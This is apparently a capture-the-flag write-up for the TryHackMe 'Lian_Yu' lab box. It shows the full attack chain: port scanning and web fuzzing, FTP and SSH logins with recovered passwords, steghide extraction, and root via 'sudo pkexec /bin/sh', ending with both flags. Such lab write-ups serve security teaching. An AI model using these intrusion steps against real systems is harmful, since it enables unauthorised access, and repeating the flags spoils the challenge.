
```basic
└─$ nmap 10.10.113.196
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 19:51 EDT
Nmap scan report for 10.10.113.196
Host is up (0.097s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 12.91 seconds
```

dirsearch gives us /island and /island/2100

the island directory gives us this, the code word had css styling to white, so when highlighed pops out


 Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante


on the page source of the directory 2100 we find this

<!-- you can avail your .ticket here but how?   -->

asking for a file 

didn't get the hint that the extension is .ticket  ,,, so wfuzz

after many,many,many tries got 

```basic                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://10.10.113.196/island/2100/FUZZ.ticket 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.113.196/island/2100/FUZZ.ticket
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                 
=====================================================================

000000001:   200        16 L     35 W       292 Ch      "# directory-list-lowercase-2.3-medium.txt"                                                             
000000002:   200        16 L     35 W       292 Ch      "#"                                                                                                     
000000003:   200        16 L     35 W       292 Ch      "# Copyright 2007 James Fisher"                                                                         
000000004:   200        16 L     35 W       292 Ch      "#"                                                                                                     
000000006:   200        16 L     35 W       292 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                         
000000010:   200        16 L     35 W       292 Ch      "#"                                                                                                     
000000009:   200        16 L     35 W       292 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                   
000000008:   200        16 L     35 W       292 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                            
000000011:   200        16 L     35 W       292 Ch      "# Priority ordered case insensative list, where entries were found"                                    
000000005:   200        16 L     35 W       292 Ch      "# This work is licensed under the Creative Commons"                                                    
000000007:   200        16 L     35 W       292 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                       
000000012:   200        16 L     35 W       292 Ch      "# on atleast 2 different hosts"                                                                        
000000013:   200        16 L     35 W       292 Ch      "#"                                                                                                     
000009698:   200        6 L      11 W       71 Ch       "green_arrow"                                                                                           
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 25017
Filtered Requests: 25003
Requests/sec.: 0




green_arrow.ticket




This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

so it's base 58 , cyber chef did not recognize it hashid neither, didn't google (picked it right up), 

```basic                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.113.196                                                                                                                                              130 ⨯
Connected to 10.10.113.196.
220 (vsFTPd 3.0.2)
Name (10.10.113.196:kali): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> mget *
mget Leave_me_alone.png? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
226 Transfer complete.
511720 bytes received in 2.33 secs (214.4395 kB/s)
mget Queen's_Gambit.png? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
226 Transfer complete.
549924 bytes received in 1.73 secs (310.8209 kB/s)
mget aa.jpg? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
226 Transfer complete.
191026 bytes received in 0.68 secs (276.1591 kB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> pwd
257 "/home/vigilante"
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01  2020 slade
drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante
226 Directory send OK.
ftp> cd slade
550 Failed to change directory.
```
the png file had the header corrupted, that gives us the password for the jpg file that has two compressed files 

```bash                                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/Image-ExifTool-12.26]
└─$ ./exiftool /home/kali/Leave_me_alone.png                                                                                                                         1 ⨯
ExifTool Version Number         : 12.26
File Name                       : Leave_me_alone.png
Directory                       : /home/kali
File Size                       : 500 KiB
File Modification Date/Time     : 2021:05:26 18:43:48-04:00
File Access Date/Time           : 2021:05:26 18:43:46-04:00
File Inode Change Date/Time     : 2021:05:26 18:43:48-04:00
File Permissions                : -rw-r--r--
Error  



                                                                                                     
┌──(kali㉿kali)-[~/Downloads/Image-ExifTool-12.26]
└─$ ./exiftool /home/kali/Leave_me_alone.png     
ExifTool Version Number         : 12.26
File Name                       : Leave_me_alone.png
Directory                       : /home/kali
File Size                       : 500 KiB
File Modification Date/Time     : 2021:05:26 19:28:50-04:00
File Access Date/Time           : 2021:05:26 19:28:50-04:00
File Inode Change Date/Time     : 2021:05:26 19:28:50-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 845
Image Height                    : 475
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 845x475
Megapixels                      : 0.401
```

```basic                                                                                                                                                                   
┌──(kali㉿kali)-[~/Downloads/Image-ExifTool-12.26]
└─$ steghide info /home/kali/aa.jpg                                                                                                                                  1 ⨯
"aa.jpg":
  format: jpeg
  capacity: 11.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                            
┌──(kali㉿kali)-[~/Downloads/Image-ExifTool-12.26]
└─$ steghide info /home/kali/aa.jpg                                                                                                                                  1 ⨯
"aa.jpg":
  format: jpeg
  capacity: 11.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "ss.zip":
    size: 596.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes


```

```basic                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ steghide extract -sf /home/kali/aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".

──(kali㉿kali)-[~]
└─$ unzip ss.zip >> letmesee


                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ cat letmesee
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado  
  
  
                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ cat passwd.txt      
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.



                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ cat shado     
M3tahuman

```
### ssh
```bash

                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ ssh slade@10.10.113.196 
The authenticity of host '10.10.113.196 (10.10.113.196)' can't be established.
ECDSA key fingerprint is SHA256:Rc91rXUKn9aMcuwG8LxCUejBAjP+xNW74MfLbPqUuhc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.113.196' (ECDSA) to the list of known hosts.
slade@10.10.113.196's password: 
			      Way To SSH...
			  Loading.........Done.. 
		   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


	██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
	██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
	██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
	██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
	███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
	╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ dir
user.txt
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak

slade@LianYu:~$ cd /root
-bash: cd: /root: Permission denied
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ pwd
/home/slade
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo pkexec /bin/sh
# cd /root
# ls
root.txt
# cat root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```


